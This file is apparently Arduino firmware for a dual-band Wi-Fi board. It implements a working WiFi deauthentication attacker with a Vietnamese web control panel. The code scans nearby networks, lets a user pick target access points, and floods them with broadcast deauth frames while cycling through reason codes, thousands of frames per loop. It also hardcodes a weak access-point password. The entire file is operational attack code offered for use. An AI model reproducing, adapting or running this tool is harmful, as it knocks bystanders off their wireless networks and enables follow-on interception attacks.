#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
} WiFiScanResult;



char *ssid = "Deauther_2-4_5GHZ";
char *pass = "123456789";



int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint16_t deauth_reason;
std::vector<int> current_targets; 
std::vector<int> deauth_targets;  
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) { 
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char*) record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(500);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}
String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}
std::map<String, String> parsePost(String &request) {
    std::map<String, String> post_params;
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params;
    }
    body_start += 4;
    String post_data = request.substring(body_start);
    int start = 0;
    int end = post_data.indexOf('&', start);
  while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params[key] = value;
        }
        start = end + 1;
        end = post_data.indexOf('&', start);
    }
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params[key] = value;
    }
    return post_params;

}
String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}
String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}
void handleRoot(WiFiClient &client) {
String html = "<html><head>";
html += "<meta charset='UTF-8'>";
html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"; 
html += "<style>";
html += "body { font-family: Arial, sans-serif; background-color: #FFFFCC; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }";
html += "h1 { text-align: center; color: #388e3c; font-size: 50px; font-weight: bold; word-wrap: break-word; white-space: normal; text-transform: uppercase; text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); margin: 10px; background-color: #cddc39; padding: 10px; border-radius: 10px; }";
html += "h2, h3 { text-align: center; color: #388e3c; margin: 10px; }";
html += "h2 { font-size: 18px; background-color: #cddc39; padding: 8px; border-radius: 5px; }"; 
html += "h3 { font-size: 20px; font-weight: bold; color: #388e3c; background-color: #cddc39; padding: 8px; border-radius: 5px; }"; 
html += "div { text-align: center; padding: 10px; width: 100%; max-width: 900px; box-sizing: border-box; }";
html += "table { width: 100%; border-collapse: collapse; margin-top: 20px; box-sizing: border-box; overflow-x: auto; display: block; }";
html += "th, td { padding: 10px; text-align: left; border: 1px solid #ddd; }";
html += "tr:nth-child(even) { background-color: #f2f2f2; }";
html += "th { background-color: #388e3c; color: white; }";
html += "button { padding: 10px 20px; background-color: #388e3c; border: none; color: white; cursor: pointer; margin: 5px 0; }";
html += "button:hover { background-color: #45a049; }";
html += "input[type='text'], select { padding: 8px; width: 100%; margin-top: 10px; box-sizing: border-box; border-radius: 5px; text-align: center; }";
html += "select { border: 2px solid #388e3c; text-align: center; }"; 
html += "form { margin-bottom: 20px; }";
html += "a { color: #388e3c; text-decoration: none; }";
html += "a:hover { text-decoration: underline; }";
html += "@media screen and (max-width: 600px) { ";
html += "  h1 { font-size: 36px; } ";
html += "  table th, table td { font-size: 12px; padding: 5px; } ";
html += "  button { padding: 8px 15px; font-size: 14px; } ";
html += "  select { font-size: 14px; } ";
html += "} ";
html += "</style>";
html += "<script>";
html += "function changeBorderColor() {";
html += "  var selectElement = document.querySelector('select[name=\"net_num\"]');";
html += "  var selectedOption = selectElement.options[selectElement.selectedIndex];";
html += "  selectElement.style.borderColor = '#FFCC00';";
html += "  selectElement.style.backgroundColor = '#FF0000';";
html += "  selectedOption.style.color = '#FFFF00';";
html += "  selectElement.style.color = '#FFFF00';";
html += "}";
html += "</script>";
html += "</head><body>";
html += "<div>";
html += "<h1>Trang Tấn Công Deauth</h1>";
html += "<h2>Danh sách mạng wifi mục tiêu ↴ </h2>";
html += "<table><tr><th>Số</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>RSSI</th><th>Tần Số</th></tr>";
for (size_t i = 0; i < scan_results.size(); i++) {
  html += "<tr><td>" + String(i + 1) + "</td><td>" + scan_results[i].ssid + "</td><td>" + scan_results[i].bssid_str + "</td><td>" + String(scan_results[i].channel) + "</td><td>" + String(scan_results[i].rssi) + "</td><td>" + ((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td></tr>";
}
html += "</table>";
html += "<form method='post' action='/rescan'><button type='submit'>Quét lại các mạng</button></form>";
html += "<h3>Bắt đầu Tấn Công Deauth</h3>";
html += "<form method='post' action='/deauth'>";
html += "<a href='/status'>Xem trạng thái đang tấn công</a><br><br>";
html += "Chọn mạng: <select name='net_num' size='5' onchange='changeBorderColor()'>"; 
for (size_t i = 0; i < scan_results.size(); i++) {
  String frequency = (scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz"; 
  String displayText = String(i + 1) + ". " + scan_results[i].ssid + " (" + frequency + ")";
  if (i == 0) {
    html += "<option value='" + String(i) + "' selected>" + displayText + "</option>";
  } else {
    html += "<option value='" + String(i) + "'>" + displayText + "</option>";
  }
}
html += "</select><br><br>";
int random_reason = random(0, 24);
html += "<input type='hidden' name='reason' value='" + String(random_reason) + "'>";
html += "<button type='submit'>Bắt Đầu Tấn Công Deauth</button></form>";
html += "<form method='post' action='/stop'><button type='submit'>Dừng Tấn Công Deauth</button></form>";
html += "</div></body></html>";
  String response = makeResponse(200, "text/html");
  response += html;
  client.write(response.c_str());
}
void handle404(WiFiClient &client) {
  client.write(makeRedirect("/").c_str());
}
void startDeauth(int network_num) {
  digitalWrite(LED_R, LOW);
  current_channel = scan_results[network_num].channel;
  deauth_running = true;
  memcpy(deauth_bssid, scan_results[network_num].bssid, 6);
  DEBUG_SER_PRINT("Starting Deauth-Attack on: " + scan_results[network_num].ssid + "\n");
  digitalWrite(LED_R, HIGH);
  digitalWrite(LED_B, HIGH);
}
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  DEBUG_SER_INIT();
  randomSeed(millis()); 
     IPAddress local_ip(192, 168, 4, 1); 
     IPAddress gateway(192, 168, 4, 1);  
     IPAddress subnet(255, 255, 255, 0); 
     WiFi.config(local_ip, gateway, subnet);


WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str()); //Không ẩn đoạn này thì hiện tên wifi





  if (scanNetworks() != 0) {
    while(true) delay(1000);
  }
  #ifdef DEBUG
  for (size_t i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
  #endif
  server.begin();
  digitalWrite(LED_G, LOW);
}
unsigned long deauth_start_time = 0; 
std::vector<uint16_t> reason_codes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24};

int reason_index = 0; 

void handleDeauth(WiFiClient &client, String &request) {
    std::map<String, String> post_data = parsePost(request);
    deauth_targets.clear();

    if (post_data.find("net_num") != post_data.end()) {
        String target_ids = post_data["net_num"];
        int start = 0, end = 0;
        while ((end = target_ids.indexOf(',', start)) != -1) {
            int target_index = target_ids.substring(start, end).toInt();
            if (target_index >= 0 && target_index < static_cast<int>(scan_results.size())) {
                deauth_targets.push_back(target_index);
            }
            start = end + 1;
        }
        int last_target = target_ids.substring(start).toInt();
        if (last_target >= 0 && last_target < static_cast<int>(scan_results.size())) {
            deauth_targets.push_back(last_target);
        }
    }

    if (!deauth_targets.empty()) {
        deauth_running = true;
        deauth_start_time = millis();
        DEBUG_SER_PRINT("Deauth started at " + String(deauth_start_time / 1000) + " seconds.\n");

        while (deauth_running) {  
            for (int target : deauth_targets) {
                if (target >= 0 && target < static_cast<int>(scan_results.size())) {
                    memcpy(deauth_bssid, scan_results[target].bssid, 6);

                    // Gửi gói tin với từng mã lý do theo thứ tự
                    for (int i = 0; i < 7000; i++) {
                        wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", reason_codes[reason_index]);
                    }

                    DEBUG_SER_PRINT("Deauth sent to: " + scan_results[target].ssid + " with reason code: " + String(reason_codes[reason_index]) + "\n");
                } else {
                    DEBUG_SER_PRINT("Invalid target index: " + String(target) + "\n");
                }
            }
            reason_index = (reason_index + 1) % reason_codes.size();
        }
        client.write(makeRedirect("/status").c_str());
    } else {
        DEBUG_SER_PRINT("No valid targets for deauth.\n");
        client.write(makeRedirect("/").c_str());
    }
}


std::vector<int> stopped_targets;
void handleStopDeauth(WiFiClient &client) {
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_B, HIGH);
  delay(3000);
  digitalWrite(LED_B, LOW);
  deauth_running = false;
  stopped_targets = deauth_targets;
  deauth_targets.clear(); 
  String response = makeResponse(200, "text/html");
  response += "<html><head>";
response += "<meta charset='UTF-8'>";
response += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
response += "<style>";
response += "body { font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; background-color: #fffacd; }";
response += "table { width: 90%; margin: 20px auto; border-collapse: collapse; }";
response += "th, td { padding: 10px; text-align: left; border: 1px solid #ddd; }";
response += "th { background-color: #4CAF50; color: white; }";
response += "tr:nth-child(even) { background-color: #f2f2f2; }";
response += "</style>";
response += "</head><body>";
response += "<h1>Tấn công Deauth đã dừng</h1>"; 
if (!stopped_targets.empty()) {
    response += "<h2>Các mục tiêu đã dừng tấn công:</h2>";
    response += "<table><tr><th>Số</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>Băng tần</th></tr>";    
    for (size_t i = 0; i < stopped_targets.size(); i++) {
        int target_index = stopped_targets[i];
        if (target_index >= 0 && target_index < static_cast<int>(scan_results.size())) {
            String band = "Không xác định"; 
            int channel = scan_results[target_index].channel;
            if (channel >= 1 && channel <= 14) {
                band = "2.4 GHz";
            } else if (channel >= 36 && channel <= 165) {
                band = "5 GHz";
            }
            response += "<tr>";
            response += "<td>" + String(i + 1) + "</td>";
            response += "<td>" + scan_results[target_index].ssid + "</td>";
            response += "<td>" + scan_results[target_index].bssid_str + "</td>";
            response += "<td>" + String(channel) + "</td>";
            response += "<td>" + band + "</td>";
            response += "</tr>";
        }
    }
    response += "</table>";
} else {
    response += "<p>Không có mục tiêu nào được dừng tấn công.</p>";
}
response += "<a href='/'>Quay lại Tấn Công Deauth</a>";
response += "</body></html>";
  client.write(response.c_str());
}
int current_target = -1;
void handleStatus(WiFiClient &client) {
  String html = "<html><head>";
html += "<meta charset='UTF-8'>";
html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
html += "<style>";
html += "body { font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; font-size: 4vw; background-color: #FFFFE0; }"; 
html += "table { width: 90%; border-collapse: collapse; margin-top: 20px; margin-left: auto; margin-right: auto; }"; 
html += "th, td { padding: 12px; text-align: center; border: 1px solid #ddd; font-size: 4vw; }";
html += "th { background-color: #4CAF50; color: white; }";
html += "tr:nth-child(even) { background-color: #f2f2f2; }";
html += "h1, h2 { text-align: center; font-size: 6vw; }";
html += "a { display: inline-block; margin-top: 20px; font-size: 4vw; text-decoration: none; color: #4CAF50; }";
html += "</style>";
html += "</head><body>";
html += "<h1>Trạng Thái Tấn Công Deauth</h1>";

if (deauth_running) {
    html += "<h2>Chi tiết tấn công các mục tiêu Deauth ↴ :</h2>";
    html += "<table>";
    html += "<tr style='background-color: #f2f2f2;'><th>Số</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>Lý do</th><th>Trạng thái</th></tr>";

    for (size_t i = 0; i < deauth_targets.size(); i++) {
        int target_index = deauth_targets[i];
        if (target_index >= 0 && target_index < static_cast<int>(scan_results.size())) {
            html += "<tr style='border-bottom: 1px solid #ddd;'>";
            html += "<td>" + String(i + 1) + "</td>";
            html += "<td>" + scan_results[target_index].ssid + "</td>";
            html += "<td>" + scan_results[target_index].bssid_str + "</td>";
            html += "<td>" + String(scan_results[target_index].channel) + "</td>";
            html += "<td>" + String(deauth_reason) + "</td>";
            html += "<td>Đang tấn công</td>";
            html += "</tr>";
        }
    }
    html += "</table>";
    html += "<p><strong>Thời gian bắt đầu từ lúc khởi động thiết bị Deauth:</strong> " + String(millis() / 1000) + " giây từ khi khởi động.</p>";
} else {
    html += "<p>Không có cuộc tấn công nào đang diễn ra, hãy tìm mục tiêu và quay trở lại đây ! </p>";
}
html += "<a href='/'>Quay lại Trang Tấn Công Deauth</a>";
html += "</body></html>";
   String response = makeResponse(200, "text/html");
   response += html;
   client.write(response.c_str());
}
int led_state = 0;
void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    digitalWrite(LED_G, HIGH);
    String request;
    while(client.available()) {
      while (client.available()) request += (char) client.read();
      delay(1);
      digitalWrite(LED_G, LOW);
    }
    DEBUG_SER_PRINT("Request received: " + request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("Requested path: " + path + "\n");
    if (path == "/") {
      handleRoot(client); 
 } else if (path == "/status") {
      handleStatus(client);  
        } else if (path == "/deauth") {
    std::map<String, String> post_data = parsePost(request);
    std::vector<int> network_nums;
    if (post_data.find("net_num") != post_data.end()) {
        String net_nums_str = post_data["net_num"];
        int start = 0, end = 0;
        while ((end = net_nums_str.indexOf(',', start)) != -1) {
            network_nums.push_back(net_nums_str.substring(start, end).toInt());
            start = end + 1;
        }
        deauth_targets.push_back(net_nums_str.substring(start).toInt());      
    }
for (int target : deauth_targets) {
    if (target >= 0 && target < static_cast<int>(scan_results.size())) {
        memcpy(deauth_bssid, scan_results[target].bssid, 6);
        wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        DEBUG_SER_PRINT("Deauth started for: " + scan_results[target].ssid + "\n");
    } else {
        DEBUG_SER_PRINT("Invalid target index: " + String(target) + "\n");
    }
}
    int network_num;
    bool post_valid = true;
    if (post_data.size() == 2) {  
        for (auto& param : post_data) {
            if (param.first == "net_num") {
                network_num = String(param.second).toInt(); 
                current_target = network_num; 
            } else if (param.first == "reason") {
                deauth_reason = String(param.second).toInt();
            } else {
                post_valid = false;
                break;
            }
        }
    } else {
        post_valid = false;  
    }
    if (post_valid) {
        startDeauth(network_num);  
        client.write(makeRedirect("/status").c_str()); 
        for (int target : network_nums) {
            if (target >= 0 && target < static_cast<int>(scan_results.size())) {
                memcpy(deauth_bssid, scan_results[target].bssid, 6);
                wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            }
        }
    } else {
        DEBUG_SER_PRINT("Received invalid post request!\n"); 
        client.write(makeRedirect("/").c_str()); 
    }
    } else if (path == "/stop") {
      handleStopDeauth(client);  
    }

else if (path == "/rescan") {
    if (scanNetworks() == 0) {
        DEBUG_SER_PRINT("Scan successful, redirecting to home page.\n");
    } else {
        DEBUG_SER_PRINT("Scan failed, redirecting to home page.\n");
    }
    client.write(makeRedirect("/").c_str());
}
  }
   if (deauth_running) {
    for (int target : deauth_targets) {
        if (target >= 0 && target < static_cast<int>(scan_results.size())) {
            memcpy(deauth_bssid, scan_results[target].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            DEBUG_SER_PRINT("Deauth packet sent to: " + scan_results[target].ssid + "\n");
        }
    }

  }
}